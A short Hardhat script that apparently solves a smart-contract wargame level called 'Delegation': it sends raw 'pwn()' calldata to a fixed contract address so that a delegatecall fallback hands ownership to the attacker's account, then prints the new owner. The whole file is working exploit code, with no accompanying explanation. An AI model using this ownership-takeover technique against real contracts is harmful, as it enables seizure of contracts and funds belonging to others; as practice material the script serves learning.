import { ethers } from "hardhat";

require("dotenv").config();

const { SEPOLIA_URL, PRIVATE_KEY, CONTRACT_VICTIM } = process.env;

async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Attackers account:", signer.address);
    
  const Delegation = await ethers.getContractFactory("Delegation");
  const delegation = await Delegation.attach("0xc0A24934FE0E6F5B94c0b81c84505570C2c23Dac");
  
  let owner = await delegation.owner();
  console.log("Victim's Owner", owner);

  const delegateeAbi = ['function pwn()']
  let iface = new ethers.utils.Interface(delegateeAbi)
  const data = iface.encodeFunctionData(`pwn`, [])

  const tx = await signer.sendTransaction({
    to: '0xc0A24934FE0E6F5B94c0b81c84505570C2c23Dac',
    data,
    gasLimit: ethers.BigNumber.from(`100000`),
  });

  await tx.wait(1);
  
  owner = await delegation.owner();
  console.log("New victim's owner", owner);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
